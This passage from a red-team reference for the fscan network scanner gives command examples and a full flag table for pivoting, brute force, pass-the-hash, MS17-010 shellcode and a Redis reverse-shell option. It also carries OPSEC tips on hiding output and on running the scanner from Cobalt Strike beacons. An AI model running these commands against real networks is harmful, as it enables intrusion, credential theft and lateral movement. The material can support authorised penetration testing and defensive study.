> 5. **-nocolor**: Disable ANSI color codes (v1.8.3+)
> 6. **-debug \<int\>**: Print progress/error summary every N seconds (default 60)

```bash
# Save to custom file
./fscan -h 10.0.0.0/16 -o /opt/scans/network_scan_2024-02-16.txt

# JSON output for automated parsing
./fscan -h 192.168.1.0/24 -o scan.json -json

# Cobalt Strike beacon (silent, save to file)
./fscan -h 172.16.0.0/24 -silent -o /tmp/.scan

# No file, stdout only
./fscan -h 192.168.1.50 -no

# Disable color for log files
./fscan -h 10.0.1.0/24 -nocolor -o scan.log
```

> **Note —** + Output Format Interpretation
> 1. **Text format**: human-readable, one result per line with prefixes (`[+]` success, `[-]` failure, `[*]` info)
> 2. **JSON format**: structured records (target, service, result, timestamp)
> 3. **-silent**: only errors and critical findings printed to stdout

> **Note —** + OPSEC Notes
> 4. Output files contain sensitive data (credentials, vulnerabilities); encrypt or secure-delete after exfiltration
> 5. Default `result.txt` in current directory; can be forensic artefact
> 6. `-silent` useful for beacon/agent execution to avoid console noise

> **Note —** + Technical Notes
> 7. JSON output (`-json`) and color control (`-nocolor`) added in v1.8.3
> 8. `-silent` intended for [Cobalt Strike](https://www.cobaltstrike.com/)/[Metasploit](https://www.metasploit.com/) integration

> **Note —** + Common Errors
> 9. **Permission denied**: cannot write to `-o` path; check directory permissions
> 10. Corrupt JSON: fscan crashed mid-scan; use `-debug` to diagnose

---

## Proxy and Network Options

> **Note —** + Purpose
> Route HTTP/SOCKS5 traffic through proxies; control network behaviour for pivoting or evasion

```bash
# HTTP proxy for web PoC requests
./fscan -h 192.168.1.0/24 -proxy http://127.0.0.1:8080

# SOCKS5 proxy for TCP connections (limited support)
./fscan -h 192.168.1.0/24 -socks5 127.0.0.1:1080

# Scan via URL with proxy
./fscan -u http://internal.target.local -proxy http://pivot.host:8080
```

> **Note —** + Proxy Options
> 1. **-proxy \<url\>**: HTTP proxy for web requests (PoC scanning, web fingerprinting)
> 2. **-socks5 \<IP:port\>**: SOCKS5 proxy for TCP connections (limited; some modules unsupported)
> 3. Note: `-socks5` disables timeouts (hardcoded behaviour)

```bash
# Burp Suite interception
./fscan -u https://192.168.1.100:8443 -proxy http://127.0.0.1:8080

# Pivot via SOCKS5 (e.g., SSH tunnel)
ssh -D 1080 user@pivot.host
./fscan -h 10.10.10.0/24 -socks5 127.0.0.1:1080

# Chain: SOCKS5 pivot + HTTP proxy for PoCs
./fscan -h 172.16.0.0/16 -socks5 127.0.0.1:1080 -proxy http://127.0.0.1:8080
```

> **Note —** + OPSEC and Detection Notes
> 1. Proxy traffic logged by proxy server (access logs, SIEM)
> 2. SOCKS5 proxy SSH tunnel creates persistent SSH session (logged)
> 3. HTTP proxy (Burp) exposes all traffic to interception/logging
> 4. `-socks5` timeout disabled; scans may hang on unreachable targets

> **Note —** + Technical Notes
> 1. SOCKS5 support added in v1.8.0; limited to simple TCP functions
> 2. HTTP proxy works for all web modules (fingerprinting, PoC scanning)
> 3. SOCKS5 does not support all Go libraries used in fscan; expect partial functionality

> **Note —** + Common Errors
> 4. **proxy connection refused**: proxy unreachable or not running
> 5. **SOCKS5 handshake failed**: incorrect proxy address or authentication required (fscan does not support SOCKS5 auth)
> 6. Timeout issues with SOCKS5: fscan disables timeout when SOCKS5 is set; manual Ctrl+C required
> 7. Some modules ignore SOCKS5: brute-force and certain PoCs may not route through SOCKS5

---

## Advanced Tuning Options

> **Note —** + Purpose
> Fine-tune scan behaviour, thread counts, timeouts, and special modes for large/complex engagements

```bash
# High-speed scan (1000 threads)
./fscan -h 10.0.0.0/16 -t 1000 -np -nobr -nopoc

# Slow, stealthy scan (50 threads, 10s timeout)
./fscan -h 192.168.1.0/24 -t 50 -time 10 -br 1

# Debug mode (verbose errors every 30s)
./fscan -h 192.168.1.0/24 -debug 30
```

> **Note —** + Advanced Options
> 1. **-t \<int\>**: Thread count (default 600); higher = faster but noisier
> 2. **-time \<int\>**: TCP/ICMP timeout in seconds (default 3)
> 3. **-wt \<int\>**: Web request timeout in seconds (default 5)
> 4. **-br \<int\>**: Brute-force threads per service (default 1)
> 5. **-num \<int\>**: PoC concurrency/rate (default 20)
> 6. **-debug \<int\>**: Print progress every N seconds (default 60)
> 7. **-top \<int\>**: Show top N live segments when scanning /8 (default 10)
> 8. **-full**: Exhaustive PoC scanning (Shiro 100 keys, backup file fuzzing)
> 9. **-dns**: Enable DNS log-based PoCs (requires external DNS log service)

```bash
# Fast reconnaissance (skip brute and PoC)
./fscan -h 172.16.0.0/16 -t 1200 -np -nobr -nopoc -time 1

# Thorough scan (full PoCs, slow)
./fscan -h 192.168.1.0/24 -full -t 200 -time 5 -wt 10 -br 2

# Debug large scan
./fscan -h 10.0.0.0/8 -m icmp -debug 10

# Custom thread tuning for unstable network
./fscan -h 192.168.1.0/24 -t 100 -time 10 -wt 15
```

> **Note —** + Tuning Guidelines
> 1. **High thread counts** reduce scan time but increase errors (timeouts, connection refused)
> 2. **Low thread counts** reduce noise but increase scan duration (longer dwell time)
> 3. **-full mode** extremely noisy (100+ Shiro requests, backup file fuzzing)
> 4. **-dns PoCs** require external service; DNS queries logged by authoritative DNS servers
> 5. Default threads (600) optimised for /24; adjust for larger/smaller ranges

> **Note —** + OPSEC Notes
> 6. High thread counts create traffic bursts (NetFlow anomalies, connection spikes)
> 7. `-full` mode generates extreme noise and may trigger rate-limiting/WAF blocks
> 8. `-debug` provides progress feedback: periodic messages (completed X of Y)

> **Note —** + Common Errors
> 9. **too many open files**: reduce `-t` or raise OS limits (`ulimit -n 10000` on Linux)
> 10. Timeouts on slow links: increase `-time` and `-wt`
> 11. Memory exhaustion on large scans: reduce `-t`, split CIDR ranges

---

## Complete Flag Reference

> **Note —** + All Command-Line Flags

| Flag | Description | Example |
|:---|:---|:---|
| **-h \<targets\>** | IP/CIDR/range/comma-separated | `-h 192.168.1.0/24` |
| **-hf \<file\>** | Target file (one IP/CIDR per line) | `-hf targets.txt` |
| **-hn \<exclude\>** | Exclude IPs/CIDR | `-hn 192.168.1.1/28` |
| **-p \<ports\>** | Ports (single/list/range/group) | `-p 22,80,443` or `-p web` |
| **-pa \<ports\>** | Add ports to defaults | `-pa 3389,5900` |
| **-pn \<ports\>** | Exclude ports | `-pn 445` |
| **-portf \<file\>** | Port file | `-portf ports.txt` |
| **-m \<module\>** | Scan module | `-m ssh` (all, icmp, netbios, smb, smb2, ssh, rdp, ftp, mssql, mysql, postgresql, redis, oracle, mongodb, memcached, ms17010, wmiexec, fcgi) |
| **-t \<int\>** | Thread count (default 600) | `-t 1000` |
| **-time \<int\>** | Timeout seconds (default 3) | `-time 10` |
| **-wt \<int\>** | Web timeout seconds (default 5) | `-wt 15` |
| **-br \<int\>** | Brute-force threads (default 1) | `-br 3` |
| **-num \<int\>** | PoC rate (default 20) | `-num 50` |
| **-user \<string\>** | Username | `-user admin` |
| **-userf \<file\>** | Username file | `-userf users.txt` |
| **-usera \<string\>** | Add username to defaults | `-usera testuser` |
| **-pwd \<string\>** | Password | `-pwd password123` |
| **-pwdf \<file\>** | Password file | `-pwdf passwords.txt` |
| **-pwda \<string\>** | Add password to defaults | `-pwda testpass` |
| **-hash \<string\>** | NTLM hash (LM:NTLM or NTLM-only) | `-hash <LM>:<NTLM>` |
| **-domain \<string\>** | SMB/WMI domain | `-domain CORP` |
| **-sshkey \<file\>** | SSH private key | `-sshkey id_rsa` |
| **-c \<string\>** | Command (SSH/WMI) | `-c "whoami; id"` |
| **-rf \<file\>** | Redis SSH public key file | `-rf id_rsa.pub` |
| **-rs \<IP:port\>** | Redis cron reverse shell target | `-rs 10.0.1.5:4444` |
| **-sc \<type\>** | MS17-010 shellcode | `-sc add` |
| **-path \<string\>** | FastCGI/SMB remote file path | `-path /var/www/html/index.php` |
| **-u \<url\>** | Single URL (comma-separated in v1.8.1+) | `-u http://target.local` |
| **-uf \<file\>** | URL file | `-uf urls.txt` |
| **-proxy \<url\>** | HTTP proxy | `-proxy http://127.0.0.1:8080` |
| **-socks5 \<IP:port\>** | SOCKS5 proxy | `-socks5 127.0.0.1:1080` |
| **-cookie \<string\>** | PoC cookie | `-cookie "session=abc123"` |
| **-pocpath \<dir\>** | Custom PoC directory (xray YAML) | `-pocpath ./pocs/` |
| **-pocname \<string\>** | Filter PoCs by name | `-pocname weblogic` |
| **-o \<file\>** | Output file (default result.txt) | `-o scan.txt` |
| **-json** | JSON output (v1.8.3+) | `-json` |
| **-no** | No file output | `-no` |
| **-silent** | Silent mode (minimal stdout) | `-silent` |
| **-nocolor** | Disable color (v1.8.3+) | `-nocolor` |
| **-np** | Skip ping/ICMP | `-np` |
| **-ping** | Use OS ping instead of raw ICMP | `-ping` |
| **-nobr** | Skip brute-force | `-nobr` |
| **-nopoc** | Skip web PoC scanning | `-nopoc` |
| **-noredis** | Skip Redis security tests | `-noredis` |
| **-full** | Full PoC scan (Shiro 100 keys, backup fuzzing) | `-full` |
| **-dns** | Enable DNS log PoCs | `-dns` |
| **-wmi** | Enable WMI | `-wmi` |
| **-debug \<int\>** | Progress interval seconds (default 60) | `-debug 30` |
| **-top \<int\>** | Top N live segments (/8 scans, default 10) | `-top 20` |

---

## References

1. [fscan GitHub Repository](https://github.com/shadow1ng/fscan)
2. [fscan Releases](https://github.com/shadow1ng/fscan/releases)
3. [fscan v1.8.0 Release Notes](https://github.com/shadow1ng/fscan/releases/tag/1.8.0)
4. [fscan v1.8.2 Release Notes](https://github.com/shadow1ng/fscan/releases/tag/1.8.2)
5. [fscan v1.8.3 Release Notes](https://github.com/shadow1ng/fscan/releases/tag/1.8.3)
6. [fscan Command Injection Vulnerability - Issue #392](https://github.com/shadow1ng/fscan/issues/392)
7. [HackTricks - Redis Security](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
8. [Microsoft Active Directory Domain Services Overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
9. [Microsoft SMB Protocol Overview](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)
10. [Microsoft NTLM Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)
11. [Microsoft WMI Documentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
12. [EternalBlue (MS17-010) - Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)
13. [xray Security Scanner](https://github.com/chaitin/xray)
14. [Impacket Toolkit](https://github.com/fortra/impacket)

---

#fscan #reconnaissance #host-discovery #port-scanning #brute-force #pass-the-hash #web-fingerprinting #vulnerability-scanning #MS17-010 #Redis-exploitation #lateral-movement #SMB #SSH #WMI #internal-network #red-team #penetration-testing
